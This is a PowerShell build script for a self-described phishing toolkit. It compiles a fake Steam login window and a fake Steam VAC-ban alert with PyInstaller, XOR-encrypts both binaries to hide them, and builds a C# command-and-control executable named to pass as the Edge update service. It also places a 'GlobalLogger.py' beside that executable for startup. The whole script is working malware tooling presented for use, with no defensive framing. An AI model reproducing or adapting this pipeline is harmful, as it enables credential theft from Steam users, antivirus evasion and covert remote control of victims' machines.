# full_rebuild.ps1 - Complete Phish Toolkit Build Pipeline
# ---------------------------------------------------------
# This script recompiles all Python modules, encrypts them, 
# and builds the final C2 executable (EdgeUpdateSvc.exe).

$ErrorActionPreference = "Stop"

Write-Host "[*] Phase 1: Cleaning up old processes..." -ForegroundColor Cyan
try { taskkill /F /IM EdgeUpdateSvc.exe /T /FI "STATUS eq RUNNING" 2>$null } catch {}
try { taskkill /F /IM SteamLogin.exe /T /FI "STATUS eq RUNNING" 2>$null } catch {}
try { taskkill /F /IM SteamAlert.exe /T /FI "STATUS eq RUNNING" 2>$null } catch {}

Write-Host "[*] Phase 2: Compiling Python modules to EXE (PyInstaller)..." -ForegroundColor Cyan

# 2.1 Steam Login
Write-Host "    -> Compiling Steam Login (main_ui.py)..." -ForegroundColor White
pyinstaller --onefile --icon=login\steam.ico --name=SteamLogin `
    --add-data "login\steam_ui.html;." `
    --add-data "login\logo.png;." `
    --add-data "login\image.png;." `
    --add-data "login\steam.ico;." `
    login\main_ui.py
Move-Item -Path "dist\SteamLogin.exe" -Destination ".\SteamLogin.exe" -Force

# 2.2 Steam Alert (VAC)
Write-Host "    -> Compiling Steam Alert (steam_notice.py)..." -ForegroundColor White
pyinstaller --onefile --icon=okno\steam.ico --name=SteamAlert `
    --add-data "okno\steam.ico;." `
    okno\steam_notice.py
Move-Item -Path "dist\SteamAlert.exe" -Destination ".\SteamAlert.exe" -Force

# Cleanup PyInstaller clutter
Remove-Item -Path "build" -Recurse -ErrorAction SilentlyContinue
Remove-Item -Path "dist" -Recurse -ErrorAction SilentlyContinue
Remove-Item -Path "*.spec" -ErrorAction SilentlyContinue

Write-Host "[*] Phase 3: Binary Encryption (XOR 0xAA)..." -ForegroundColor Cyan
$files = @("SteamAlert.exe", "SteamLogin.exe")
$key = 0xAA

foreach ($file in $files) {
    if (Test-Path $file) {
        $bytes = [IO.File]::ReadAllBytes("$PWD\$file")
        for ($i = 0; $i -lt $bytes.Length; $i++) {
            $bytes[$i] = $bytes[$i] -bxor $key
        }
        $outFile = $file.Replace(".exe", ".bin")
        [IO.File]::WriteAllBytes("$PWD\$outFile", $bytes)
        Write-Host "    [+] Encrypted $file -> $outFile" -ForegroundColor Green
    } else {
        Write-Error "CRITICAL: $file not found after compilation!"
    }
}

Write-Host "[*] Phase 4: Building C# C2 (NativeAOT)..." -ForegroundColor Cyan
dotnet publish -c Release -r win-x64 -p:PublishAot=true --nologo

if ($LASTEXITCODE -eq 0) {
    $FinalExe = ".\bin\Release\net8.0-windows\win-x64\publish\EdgeUpdateSvc.exe"
    $PublishDir = ".\bin\Release\net8.0-windows\win-x64\publish\"
    
    # Ensure GlobalLogger.py is in the same directory for startup
    if (Test-Path "GlobalLogger.py") {
        Copy-Item -Path "GlobalLogger.py" -Destination $PublishDir -Force
        Write-Host "[+] GlobalLogger.py copied to publish directory." -ForegroundColor Green
    }

    Write-Host "`n[SUCCESS] Full rebuild complete!" -ForegroundColor Green
    Write-Host "[+] Binary location: $FinalExe" -ForegroundColor Green
    Write-Host "[!] Size: $([math]::Round((Get-Item $FinalExe).Length / 1MB, 1)) MB" -ForegroundColor White
} else {
    Write-Error "C# Build FAILED!"
}
